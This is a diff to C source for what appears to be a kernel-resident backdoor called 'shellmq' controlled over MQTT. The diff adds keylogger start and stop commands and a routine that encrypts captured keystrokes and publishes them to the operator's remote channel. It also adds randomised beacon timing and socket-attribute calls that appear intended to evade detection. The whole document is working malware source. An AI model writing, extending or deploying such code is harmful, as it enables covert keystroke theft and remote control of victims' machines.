@@ -30,6 +30,7 @@ static u8 sess_rx[32];
 static u8 nonce_r[24];
 static u64 txctr;
 static u64 rxctr;
+static u64 ktxctr;
 static int keys_ready;
 static u64 file_rxctr;
 static u8 handshake_ack[8+24] = {0xac, 0xed, 0xac, 0xed, 0xac, 0xed, 0xac, 0xed};
@@ -51,6 +52,7 @@ void try_handshake (const u8* payload)
 	if (proxy_session_keys(payload, nonce_r, sess_tx, sess_rx)==0) {
 		txctr = 1;
 		rxctr = 1;
+		ktxctr = 1;
 		file_rxctr = 1;
 		keys_ready = 1;
 		memcpy(handshake_ack+8, nonce_r, 24);
@@ -188,7 +190,15 @@ void run_cmd (const u8* payload, int len)
 
 	int n;
 #ifdef CFG_KEYLOGGER
-	if (strncmp((char*)cmd, "@keylog", 7)==0)
+	if (strncmp((char*)cmd, "@keylogstart", 12)==0) {
+		keylog_until = time_uptime+300;
+		n = 2;
+		memcpy(out, "ok", 2);
+	} else if (strncmp((char*)cmd, "@keylogstop", 11)==0) {
+		keylog_until = 0;
+		n = 2;
+		memcpy(out, "ok", 2);
+	} else if (strncmp((char*)cmd, "@keylog", 7)==0)
 		n = keylog_dump((char*)out, MAX_CMD_OUT);
 	else
 #endif
@@ -238,6 +248,31 @@ void run_cmd (const u8* payload, int len)
 	free(out, M_TEMP);
 }
 
+#ifdef CFG_KEYLOGGER
+static
+void keylog_publish (u8* buf, u8* sealed)
+{
+	char top[64];
+	int n, mlen;
+
+	if (time_uptime>=keylog_until)
+		return;
+	n = keylog_stream((char*)buf, 4096);
+	if (n<=0)
+		return;
+	mlen = proxy_seal(buf, n, sess_tx, 0x05, ktxctr, sealed, 4096+16);
+	if (mlen<=0)
+		return;
+	ktxctr++;
+	snprintf(top, sizeof(top), "%s/k", mid_str);
+	if (remmqtt_pub(&rmq, top, sealed, mlen, 0)!=0) {
+		remmqtt_flush(&rmq);
+		(void)remmqtt_pub(&rmq, top, sealed, mlen, 0);
+	}
+	remmqtt_flush(&rmq);
+}
+#endif
+
 static u8 cmd_q[2048];
 static int cmd_q_len = 0;
 
@@ -279,11 +314,13 @@ int wait_for_op (void)
 	if (remmqtt_pub(&rmq, top, hello, sizeof(hello), 0)!=0)
 		return (1);
 
-	for (int i = 0; i<120 && !keys_ready && !shutting_down; i++) {
+	for (int i = 0; i<12 && !keys_ready && !shutting_down; i++) {
+		proxy_attr_socket(rmq.rc.so);
+		proxy_attr_socket(outsock.so);
 		if (remmqtt_sync(&rmq)!=0)
 			return (1);
 		if (!keys_ready) {
-			pause("mqsess", hz/5);
+			pause("mqsess", hz * (1 + arc4random_uniform(3)));
 			remmqtt_pub(&rmq, top, hello, sizeof(hello), 0);
 		}
 	}
@@ -294,6 +331,10 @@ static
 void session_once (struct thread* td)
 {
 	char top[64];
+#ifdef CFG_KEYLOGGER
+	u8* kbuf = NULL;
+	u8* kseal = NULL;
+#endif
 
 #ifdef DBGMODEDONTUSEME
 	printf("shellmq: session\n");
@@ -340,11 +381,18 @@ void session_once (struct thread* td)
 	printf("shellmq: op handshake ok\n");
 #endif
 
+#ifdef CFG_KEYLOGGER
+	kbuf = malloc(4096, M_TEMP, M_WAITOK);
+	kseal = malloc(4096+16, M_TEMP, M_WAITOK);
+#endif
+
 	time_t last_hello = 0;
 	u8 hello[8+24];
 
 	while (!shutting_down) {
-		if (time_uptime - last_hello >= 5) {
+		proxy_attr_socket(rmq.rc.so);
+		proxy_attr_socket(outsock.so);
+		if (time_uptime - last_hello >= 4 + arc4random_uniform(4)) {
 			proxy_hello(hello, nonce_r);
 			snprintf(top, sizeof(top), "%s/h", mid_str);
 			remmqtt_pub(&rmq, top, hello, sizeof(hello), 0);
@@ -369,6 +417,9 @@ void session_once (struct thread* td)
 			reset_mqtt();
 			pause("snsettle", hz/20);
 		}
+#ifdef CFG_KEYLOGGER
+		keylog_publish(kbuf, kseal);
+#endif
 		if (cmd_q_len>0) {
 			run_cmd(cmd_q, cmd_q_len);
 			cmd_q_len = 0;
@@ -378,6 +429,12 @@ void session_once (struct thread* td)
 	}
 
 out:
+#ifdef CFG_KEYLOGGER
+	if (kbuf!=NULL)
+		free(kbuf, M_TEMP);
+	if (kseal!=NULL)
+		free(kseal, M_TEMP);
+#endif
 	file_reset();
 	remmqtt_close(&rmq);
 	proxy_attr_socket_clear();
